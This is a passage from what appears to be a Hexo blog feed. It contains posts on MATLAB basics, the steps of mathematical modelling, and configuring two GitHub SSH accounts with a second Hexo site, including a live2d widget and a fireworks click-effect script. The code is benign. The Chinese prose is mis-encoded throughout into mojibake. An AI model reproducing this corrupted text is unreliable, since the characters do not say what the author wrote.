alt=""></p></li><li><p>çŸ©é˜µæ±‚é€†è¿ç®— inv å‡½æ•°ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb95d8d1797d.png" class="lazyload"></p></li><li><p>æ ¼å¼åŒ–è¾“å‡º format short(long)ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb95e3e30a1b.png" class="lazyload"></p></li><li><p>çŸ©é˜µæ¯ä¸€ä¸ªå…ƒç´ çš„å¹³æ–¹ï¼ˆs.*s)ï¼Œç«‹æ–¹(s.^3)æ“ä½œï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb95ed30a03c.png" class="lazyload"></p></li><li><p>çŸ©é˜µçš„æ‰©å……æ“ä½œï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb95f5d5a4e8.png" class="lazyload"></p><h3 id="ä¸‰-å·¥ä½œç©ºé—´å˜é‡"><a href="#ä¸‰-å·¥ä½œç©ºé—´å˜é‡" class="headerlink" title="ä¸‰. å·¥ä½œç©ºé—´å˜é‡"></a>ä¸‰. å·¥ä½œç©ºé—´å˜é‡</h3></li><li><p>magic å’Œ rand ï¼Œä»¥åŠwhoså‘½ä»¤</p><p>magicæ˜¯ä¸€ç§ç”¨äºäº§ç”Ÿé­”æ–¹çŸ©é˜µçš„å‡½æ•°ï¼Œäº§ç”Ÿçš„çŸ©é˜µçš„æ¯è¡Œã€åˆ—ä»¥åŠå¯¹è§’çº¿çš„æ•°ä¹‹å’Œç›¸ç­‰ã€‚è¯¥å’Œçš„å€¼ä¸º1+2+3+â€¦..+n^2çš„å’Œå†é™¤ä»¥nï¼Œnå¿…é¡»ä¸ºå¤§äºæˆ–ç­‰äº3çš„æ•´æ•°ã€‚ </p><p>randå‡½æ•°åˆ™ç”¨äºäº§ç”Ÿç”±åœ¨(0, 1)ä¹‹é—´å‡åŒ€åˆ†å¸ƒçš„éšæœºæ•°ç»„æˆçš„æ•°ç»„ ï¼Œå¦‚randï¼ˆ4ï¼‰åˆ™æ˜¯äº§ç”Ÿä¸€ä¸ª1è¡Œ4åˆ—çš„æ•°ç»„ï¼Œrandï¼ˆ2ï¼Œ3ï¼‰åˆ™æ˜¯2è¡Œ3åˆ—çŸ©é˜µï¼Œrandï¼ˆ2ï¼Œ3ï¼Œ4ï¼‰åˆ™æ˜¯å››ä¸ª2è¡Œ3åˆ—çš„çŸ©é˜µ</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb961e66a53f.png" class="lazyload"></p></li><li><p>saveï¼Œloadï¼Œclear å‘½ä»¤ã€‚saveç”¨äºä¿å­˜æ•°æ®åˆ° matæ–‡ä»¶ä¸­ï¼Œloadç”¨äºåŠ è½½matæ–‡ä»¶ï¼Œclearåˆ™æ˜¯æ¸…é™¤å½“å‰å·¥ä½œåŒºå˜é‡ã€‚</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb9628c75d19.png" class="lazyload"></p></li></ul><h3 id="å››-å­—ç¬¦å’Œå­—ç¬¦ä¸²æ“ä½œ"><a href="#å››-å­—ç¬¦å’Œå­—ç¬¦ä¸²æ“ä½œ" class="headerlink" title="å››. å­—ç¬¦å’Œå­—ç¬¦ä¸²æ“ä½œ"></a>å››. å­—ç¬¦å’Œå­—ç¬¦ä¸²æ“ä½œ</h3><ul><li><p>å®šä¹‰å­—ç¬¦å’Œå­—ç¬¦ä¸²ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb963f2ec434.png" class="lazyload"></p></li><li><p>æ•°å­—è½¬å­—ç¬¦ï¼Œå­—ç¬¦æ‹¼æ¥ï¼ˆint2str or num2strå‡½æ•°ï¼‰ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb965001606c.png" class="lazyload"></p><h3 id="äº”-è°ƒç”¨å‡½æ•°"><a href="#äº”-è°ƒç”¨å‡½æ•°" class="headerlink" title="äº”. è°ƒç”¨å‡½æ•°"></a>äº”. è°ƒç”¨å‡½æ•°</h3></li><li><p>matlab å’Œå¤§å¤šæ•°ç¼–ç¨‹è¯­è¨€ä¸€æ ·ï¼Œæä¾›äº†å¾ˆå¤šå‡½æ•°æ¥ç®€åŒ–ä»£ç æé«˜æ•ˆç‡ï¼Œä¾‹å¦‚å¸¸è§çš„ minï¼Œmaxå‡½æ•°ï¼Œä¸”å‡½æ•°åŒæ ·å…·æœ‰è¿”å›å€¼ç±»å‹ï¼Œä¸ªæ•°ç­‰æ¡ä»¶:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb9674e3f44e.png" class="lazyload"></p></li><li><p>zerosï¼Œones å‡½æ•°ï¼Œç”Ÿæˆç‰¹å®šçŸ©é˜µï¼ˆå…¨é›¶æˆ–è€…å…¨ä¸€ï¼‰ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb967c6a83a3.png" class="lazyload"></p></li><li><p>sizeï¼Œsumå‡½æ•°ï¼Œsizeç”¨äºè®¡ç®—å¤§å°ï¼Œå¦‚çŸ©é˜µçš„è¡Œåˆ—æ•°ï¼Œsumåˆ™ç”¨äºæ±‚å’Œï¼Œä¸¤è€…ä¼ å‚æœ‰ç›¸ä¼¼ä¹‹å¤„ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb968c8cee9a.png" class="lazyload"></p></li></ul><p>  <img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb9687d4ff42.png" class="lazyload"></p>]]></content>
      
      
      <categories>
          
          <category> æ•°å­¦å»ºæ¨¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•°æ¨¡ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æ•°å­¦å»ºæ¨¡_day1</title>
      <link href="/2018/10/06/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day1/"/>
      <url>/2018/10/06/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day1/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="æ•°å­¦å»ºæ¨¡-day1â€“åˆå…¥æ•°æ¨¡"><a href="#æ•°å­¦å»ºæ¨¡-day1â€“åˆå…¥æ•°æ¨¡" class="headerlink" title="æ•°å­¦å»ºæ¨¡_day1â€“åˆå…¥æ•°æ¨¡"></a>æ•°å­¦å»ºæ¨¡_day1â€“åˆå…¥æ•°æ¨¡</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; ä½œä¸ºä¸€ä¸ªå¤§äºŒåˆšå¼€å§‹çš„å­¦ç”Ÿæ‰çœŸæ­£æ¥è§¦æ•°æ¨¡ï¼Œè™½ç„¶æœ‰ç‚¹æ™šäº†ï¼Œä½†æˆ‘ç›¸ä¿¡æœ‰ä»˜å‡ºï¼Œå°±æœ‰å›æŠ¥ï¼Œæ²¡æœ‰ä»˜å‡ºå°±æ²¡æœ‰é¦…é¥¼ğŸ˜„ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æ•°å­¦å»ºæ¨¡æ˜¯ä»€ä¹ˆä¸œè¥¿å‘¢ï¼Ÿç®€å•æ¥è¯´å°±æ˜¯é€šè¿‡æ•°å­¦çš„ç¬¦å·å’Œè¯­è¨€ä½œè¡¨è¿°æ¥å»ºç«‹æ•°å­¦æ¨¡å‹ï¼Œè€Œæ­¤æ•°å­¦æ¨¡å‹é¦–å…ˆæ˜¯æ ¹æ®å®é™…é—®é¢˜å»ºç«‹çš„ï¼Œé€šè¿‡è¿™ä¸ªå»ºç«‹çš„æ•°å­¦æ¨¡å‹ï¼Œæˆ‘ä»¬å¯ä»¥å»è§£å†³ä¸€ä¸ªå®é™…çš„é—®é¢˜ï¼Œå¦‚å…±äº«å•è½¦ï¼ŒåŸå¸‚æ’æ±¡ç­‰ç­‰é—®é¢˜ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æ•°å­¦å»ºæ¨¡çš„è¿‡ç¨‹åŒ…æ‹¬è¡¨è¿°ï¼Œæ±‚è§£ï¼Œè§£é‡Šï¼Œæ£€éªŒå››ä¸ªè¿‡ç¨‹ã€‚å¯ç»†åˆ†ä¸ºä¸ƒä¸ªæ­¥éª¤ï¼šæ¨¡å‹å‡†å¤‡ï¼Œæ¨¡å‹å‡è®¾ï¼Œæ¨¡å‹æ„æˆï¼Œæ¨¡å‹æ±‚è§£ï¼Œæ¨¡å‹åˆ†æï¼Œæ¨¡å‹æ£€éªŒï¼Œæ¨¡å‹åº”ç”¨ã€‚</p><h3 id="1-æ¨¡å‹å‡†å¤‡"><a href="#1-æ¨¡å‹å‡†å¤‡" class="headerlink" title="1.æ¨¡å‹å‡†å¤‡"></a>1.æ¨¡å‹å‡†å¤‡</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; ä½œä¸ºå»ºæ¨¡çš„ç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬é¦–å…ˆåº”è¯¥äº†è§£ç»™å‡ºçš„é‚£ä¸ªé—®é¢˜çš„å®é™…èƒŒæ™¯ï¼Œå†æ˜ç¡®å»ºæ¨¡çš„ç›®çš„ï¼Œä»è€Œå¯ä»¥é’ˆå¯¹æ€§åœ°æœé›†æœ‰å…³çš„ä¿¡æ¯ï¼ŒæŒæ¡æ¨¡å‹å¯¹è±¡çš„ç‰¹å¾ä¹‹åï¼Œåœ¨æˆ‘ä»¬è„‘æµ·ä¸­å½¢æˆä¸€ä¸ªæ¯”è¾ƒæ¸…æ™°çš„é—®é¢˜ã€‚æ¯”å¦‚å…±äº«å•è½¦çš„æŠ•æ”¾é—®é¢˜ï¼Œé¢å¯¹è¿™ä¸ªé—®é¢˜æˆ‘ä»¬é¦–å…ˆå°±çŸ¥é“äº†éœ€è¦å¾—å‡ºä¸€ä¸ªåˆç†çš„æŠ•æ”¾é‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦ä»å¤šæ–¹é¢æ¥è·å–ä¿¡æ¯ï¼Œå¦‚å„åœ°äººå£æ•°é‡ï¼Œäº¤é€šæƒ…å†µï¼Œä»¥åŠåŸºç¡€è®¾æ–½å®Œå–„ç¨‹åº¦ç­‰ç­‰ä¿¡æ¯ï¼Œæ¥ä¸°å¯Œè¿™ä¸ªæ¨¡å‹çš„ç‰¹å¾ï¼Œè¿›è€Œå»ºç«‹å‡ºåˆç†çš„æ¨¡å‹æ¥è§£å†³å…±äº«å•è½¦çš„æŠ•æ”¾é—®é¢˜ã€‚<br><img src="https://i.loli.net/2018/10/06/5bb8d2dd91a08.png" alt=""></p><h3 id="2-æ¨¡å‹å‡è®¾"><a href="#2-æ¨¡å‹å‡è®¾" class="headerlink" title="2.æ¨¡å‹å‡è®¾"></a>2.æ¨¡å‹å‡è®¾</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; åœ¨æ¨¡å‹å‡è®¾è¿™ä¸€æ­¥ä¸­ï¼Œå¾ˆæ˜æ˜¾ä½ å»ºç«‹å‡ºæ¥çš„æ¨¡å‹æ˜¯å¦åˆç†å–å†³äºå®ƒçš„å¯ç”¨æ€§ï¼Œé’ˆå¯¹é—®é¢˜çš„ç‰¹ç‚¹å’Œå»ºæ¨¡ç›®çš„ï¼Œè¦åšå‡ºæœ€åˆç†çš„æ¨¡å‹å‡è®¾ï¼Œæ€ä¹ˆä¸ªåˆç†æ³•å‘¢ï¼Ÿé‚£å°±æ˜¯è¦ç¬¦åˆå®é™…æƒ…å†µï¼Œå¦‚ç‰©è´¨æˆæœ¬ï¼Œæ—¶é—´æˆæœ¬ï¼Œç©ºé—´æˆæœ¬ç­‰ç­‰æ¡ä»¶ã€‚<br><img src="https://i.loli.net/2018/10/06/5bb8d3068e279.png" alt=""></p><h3 id="3-æ¨¡å‹æ„æˆ"><a href="#3-æ¨¡å‹æ„æˆ" class="headerlink" title="3.æ¨¡å‹æ„æˆ"></a>3.æ¨¡å‹æ„æˆ</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; æ¨¡å‹çš„æ„æˆå°±éœ€è¦æˆ‘ä»¬å¥½å¥½è®²ç©¶äº†ï¼Œæ­£æ‰€è°“è®²ç©¶è€Œä¸å°†å°±ï¼Œå¦‚ä½•åœ¨å®é™…æƒ…å†µä¸æ„æˆéš¾åº¦ä¹‹é—´åšå‡ºæœ€åˆé€‚çš„è¡¨è¾¾ä¹Ÿæ˜¯ä¸€é—¨è‰ºæœ¯ã€‚è¿™ä¸€æ­¥æˆ‘ä»¬éœ€è¦å°½é‡é‡‡ç”¨ç®€å•æ™®éçš„æ•°å­¦å·¥å…·æ¥æ„æˆæ¨¡å‹ã€‚<br><img src="https://i.loli.net/2018/10/06/5bb8d31f817e6.png" alt=""></p><h3 id="4-æ¨¡å‹æ±‚è§£"><a href="#4-æ¨¡å‹æ±‚è§£" class="headerlink" title="4.æ¨¡å‹æ±‚è§£"></a>4.æ¨¡å‹æ±‚è§£</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; é€šè¿‡å„ç§æ•°å­¦æ–¹æ³•ï¼Œè½¯ä»¶ï¼ˆmatlabï¼Œmathematicalï¼Œlingoï¼‰ï¼Œä»¥åŠè®¡ç®—æœºç¼–ç¨‹æŠ€æœ¯ï¼Œæ¥å¯¹æ¨¡å‹è¿›è¡Œé«˜æ•ˆç‡åœ°æ±‚è§£ã€‚</p><h3 id="5-æ¨¡å‹åˆ†æ"><a href="#5-æ¨¡å‹åˆ†æ" class="headerlink" title="5.æ¨¡å‹åˆ†æ"></a>5.æ¨¡å‹åˆ†æ</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; å¯¹æ±‚å‡ºæ¥çš„ç»“æœè¿›è¡Œè¯¯å·®åˆ†æï¼Œç»Ÿè®¡åˆ†æï¼Œä»¥åŠæ¨¡å‹å¯¹æ•°æ®çš„ç¨³å®šæ€§åˆ†æï¼ˆæœºå™¨å­¦ä¹ ä¹Ÿæœ‰æ¶‰åŠï¼š1. è®¡ç®—çš„ç¨³å®šæ€§(Computational Stability)ï¼›2. æ•°æ®ç¨³å®šæ€§ï¼›3. æ€§èƒ½çš„ç¨³å®šæ€§ [å‚è€ƒé“¾æ¥]: <a href="https://blog.csdn.net/zhouwenyuan1015/article/details/78228818ï¼‰" target="_blank" rel="noopener">https://blog.csdn.net/zhouwenyuan1015/article/details/78228818ï¼‰</a></p><h3 id="6-æ¨¡å‹æ£€éªŒ"><a href="#6-æ¨¡å‹æ£€éªŒ" class="headerlink" title="6.æ¨¡å‹æ£€éªŒ"></a>6.æ¨¡å‹æ£€éªŒ</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; æ•°å­¦è®²ç©¶ä¸€ä¸ªä¸¥è°¨ï¼Œå› è€Œåœ¨æ¨¡å‹æ±‚è§£ä¹‹åè¿›è¡Œæ£€éªŒé‚£æ˜¯å¿…ç„¶çš„ã€‚æˆ‘ä»¬éœ€è¦å°†è§£å‡ºæ¥çš„æ•°æ®ä¸å®é™…ç°è±¡ï¼Œç°å®æ•°æ®æ¯”è¾ƒï¼Œä»è€Œæ£€éªŒæ¨¡å‹çš„åˆç†æ€§ã€‚</p><h3 id="7-æ¨¡å‹åº”ç”¨"><a href="#7-æ¨¡å‹åº”ç”¨" class="headerlink" title="7.æ¨¡å‹åº”ç”¨"></a>7.æ¨¡å‹åº”ç”¨</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; å½“æ¨¡å‹èƒ½å¤Ÿå¾—åˆ°åº”ç”¨æ—¶ï¼Œè¯´æ˜è¿™æ˜¯ä¸ªæˆç†Ÿçš„æ¨¡å‹äº†ï¼Œè¯¥å­¦ä¼šè‡ªå·±è§£å†³é—®é¢˜äº†ï¼ˆè„‘è¡¥ æˆç†Ÿçš„æ¨¡å‹.jpgğŸ˜„)ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ•°å­¦å»ºæ¨¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•°æ¨¡ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å¤šGitè´¦æˆ·ä»¥åŠHexoæ­å»ºåšå®¢è¿›é˜¶</title>
      <link href="/2018/10/06/%E5%A4%9AGit%E8%B4%A6%E6%88%B7%E4%BB%A5%E5%8F%8AHexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E8%BF%9B%E9%98%B6/"/>
      <url>/2018/10/06/%E5%A4%9AGit%E8%B4%A6%E6%88%B7%E4%BB%A5%E5%8F%8AHexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="å¤šGitè´¦æˆ·ä»¥åŠHexoæ­å»ºåšå®¢è¿›é˜¶"><a href="#å¤šGitè´¦æˆ·ä»¥åŠHexoæ­å»ºåšå®¢è¿›é˜¶" class="headerlink" title="å¤šGitè´¦æˆ·ä»¥åŠHexoæ­å»ºåšå®¢è¿›é˜¶"></a>å¤šGitè´¦æˆ·ä»¥åŠHexoæ­å»ºåšå®¢è¿›é˜¶</h1><h2 id="1-ç”Ÿæˆå¯†é’¥"><a href="#1-ç”Ÿæˆå¯†é’¥" class="headerlink" title="1.ç”Ÿæˆå¯†é’¥"></a>1.ç”Ÿæˆå¯†é’¥</h2><blockquote><p><img src="https://i.loli.net/2018/10/04/5bb631dc309a8.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°å·²ç»ç”Ÿæˆçš„id_rsaæ˜¯0LinkSec gitè´¦æˆ·çš„å¯†é’¥</p><p>è€Œyof3ngçš„åˆ™æ˜¯æˆ‘å‡†å¤‡æ­å»ºçš„ç¬¬äºŒä¸ªhexoçš„å¯†é’¥</p></blockquote><h2 id="2-é…ç½®configæ–‡ä»¶"><a href="#2-é…ç½®configæ–‡ä»¶" class="headerlink" title="2.é…ç½®configæ–‡ä»¶"></a>2.é…ç½®configæ–‡ä»¶</h2><blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#userName1(yof3ng@gmail.com)0LinkSec Lab</span>Host 0LinkSecHostName github<span class="token punctuation">.</span>comPreferredAuthentications publickeyIdentityFile <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>id_rsa<span class="token comment" spellcheck="true">#userName2 yof3ng@qq.com</span>Host yof3ngHostName github<span class="token punctuation">.</span>comPreferredAuthentications publickeyIdentityFile <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>yof3ng</code></pre><p>éœ€è¦æ³¨æ„çš„æ˜¯ç¼©è¿›é—®é¢˜ï¼Œç¼©è¿›å¯èƒ½ä¼šäº§ç”ŸæŠ¥é”™ã€‚</p><p>åœ¨githubä¸Šæ·»åŠ å®Œsshå¯†é’¥ä¹‹åå³å¯è¿›è¡Œä¸‹ä¸€æ­¥</p></blockquote><h2 id="3-gitè¿æ¥æµ‹è¯•"><a href="#3-gitè¿æ¥æµ‹è¯•" class="headerlink" title="3.gitè¿æ¥æµ‹è¯•"></a>3.gitè¿æ¥æµ‹è¯•</h2><blockquote><p>ç¬¬ä¸€ä¸ªè´¦æˆ·git@0LinkSecï¼š</p><p><img src="https://i.loli.net/2018/10/04/5bb632d0def6c.png" alt=""></p><p>ç¬¬äºŒä¸ªè´¦æˆ·git@yof3ngï¼š</p><p><img src="https://i.loli.net/2018/10/04/5bb632ecc2c9c.png" alt=""></p><p>ä¸¤ä¸ªè´¦æˆ·å·²ç»å»ºç«‹æˆåŠŸï¼Œæ¥ä¸‹æ¥å³å¯è¿›è¡Œç¬¬äºŒä¸ªhexoçš„æ­å»ºã€‚</p></blockquote><h2 id="4-ç¬¬äºŒä¸ªhexoåˆå§‹åŒ–åé…ç½®-configæ–‡ä»¶"><a href="#4-ç¬¬äºŒä¸ªhexoåˆå§‹åŒ–åé…ç½®-configæ–‡ä»¶" class="headerlink" title="4.ç¬¬äºŒä¸ªhexoåˆå§‹åŒ–åé…ç½® configæ–‡ä»¶"></a>4.ç¬¬äºŒä¸ªhexoåˆå§‹åŒ–åé…ç½® configæ–‡ä»¶</h2><blockquote><p><img src="https://i.loli.net/2018/10/04/5bb6376eaf144.png" alt=""></p><p>â€‹    å¼ºè°ƒrepositoryé¡¹ï¼šåº”è¯¥è®¾ç½®ä¸ºå‰é¢è®¾ç½®çš„ç¬¬äºŒç”¨æˆ·,è‹¥ä¸º<a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>åˆ™ä¼šé»˜è®¤ä¸ºç¬¬ä¸€ç”¨æˆ·ï¼Œè¿æ¥0LinkSecã€‚</p><p>åˆ°æ­¤ç¬¬äºŒhexoæ­å»ºæˆåŠŸã€‚</p></blockquote><h2 id="5-souceç›®å½•ä¸‹CNAMEæ–‡ä»¶å»ºç«‹ï¼Œä»¥åŠåŸŸåCNAMEè®°å½•å»ºç«‹"><a href="#5-souceç›®å½•ä¸‹CNAMEæ–‡ä»¶å»ºç«‹ï¼Œä»¥åŠåŸŸåCNAMEè®°å½•å»ºç«‹" class="headerlink" title="5.souceç›®å½•ä¸‹CNAMEæ–‡ä»¶å»ºç«‹ï¼Œä»¥åŠåŸŸåCNAMEè®°å½•å»ºç«‹"></a>5.souceç›®å½•ä¸‹CNAMEæ–‡ä»¶å»ºç«‹ï¼Œä»¥åŠåŸŸåCNAMEè®°å½•å»ºç«‹</h2><blockquote><p>åœ¨åŸŸåè§£æå¤„æ–°å»ºyof3ngäºŒçº§åŸŸåCNAMEè®°å½•ï¼ŒæŒ‡å‘ yof3ng.github.io,ä»¥åŠåœ¨hexoæ ¹ç›®å½•ä¸‹çš„sourceæ–‡ä»¶å¤¹å»ºç«‹CNAMEæ–‡ä»¶ï¼Œå°†yof3ng.0Link.topå¡«å…¥å…¶ä¸­å³å¯ã€‚</p><p><img src="https://i.loli.net/2018/10/05/5bb76525ca26d.png" alt=""></p></blockquote><h2 id="6-å¼€å¯å¼ºåˆ¶httpsæœåŠ¡é€‰é¡¹"><a href="#6-å¼€å¯å¼ºåˆ¶httpsæœåŠ¡é€‰é¡¹" class="headerlink" title="6.å¼€å¯å¼ºåˆ¶httpsæœåŠ¡é€‰é¡¹"></a>6.å¼€å¯å¼ºåˆ¶httpsæœåŠ¡é€‰é¡¹</h2><p>åœ¨github å¯¹åº”ä»“åº“ä¸­çš„settingä¸­è®¾ç½®å³å¯ã€‚</p><h2 id="7-æ·»åŠ èŒå® ç²¾çµ"><a href="#7-æ·»åŠ èŒå® ç²¾çµ" class="headerlink" title="7.æ·»åŠ èŒå® ç²¾çµ"></a>7.æ·»åŠ èŒå® ç²¾çµ</h2><blockquote><p><a href="https://blog.csdn.net/Aoman_Hao/article/details/82049821" target="_blank" rel="noopener">å‚è€ƒ</a>é“¾æ¥</p><p>åˆ‡æ¢åˆ°åšå®¢ç›®å½•ç„¶åè¾“å…¥ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#å®‰è£…live2d</span>npm install <span class="token operator">-</span><span class="token operator">-</span>save hexo<span class="token operator">-</span>helper<span class="token operator">-</span>live2d<span class="token comment" spellcheck="true">#å®‰è£…èŒå® module</span>npm install live2d<span class="token operator">-</span>widget<span class="token operator">-</span>model<span class="token operator">-</span>koharu </code></pre><p>æ·»åŠ åœ¨configæ–‡ä»¶å†…ï¼š</p><pre class=" language-shell"><code class="language-shell">live2d:  enable: true  scriptFrom: local  model:    use: live2d-widget-model-koharu  display:    position: right    width: 140    height: 260  mobile:    show: true</code></pre><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb847f7047c9.png" class="lazyload"></p></blockquote><h2 id="8-æ·»åŠ é¼ æ ‡ç‚¹å‡»ç‰¹æ•ˆ"><a href="#8-æ·»åŠ é¼ æ ‡ç‚¹å‡»ç‰¹æ•ˆ" class="headerlink" title="8.æ·»åŠ é¼ æ ‡ç‚¹å‡»ç‰¹æ•ˆ"></a>8.æ·»åŠ é¼ æ ‡ç‚¹å‡»ç‰¹æ•ˆ</h2><blockquote><p>æ·»åŠ é¼ æ ‡ç‚¹å‡»çˆ†ç‚¸æ•ˆæœï¼š<br>åœ¨ä¸»é¢˜çš„jsç›®å½•ä¸‹åˆ›å»ºfireworks.jså¹¶å†™å…¥å¦‚ä¸‹ä»£ç </p><pre class=" language-javascript"><code class="language-javascript"><span class="token string">"use strict"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>pointerX<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>clientX<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientX<span class="token punctuation">)</span><span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>left<span class="token punctuation">,</span>pointerY<span class="token operator">=</span>e<span class="token punctuation">.</span>clientY<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientY<span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>top<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> t<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">360</span><span class="token punctuation">)</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token operator">/</span><span class="token number">180</span><span class="token punctuation">,</span>a<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">{</span>x<span class="token punctuation">:</span>e<span class="token punctuation">.</span>x<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">cos</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span>e<span class="token punctuation">.</span>y<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span>colors<span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>colors<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>endPos<span class="token operator">=</span><span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span 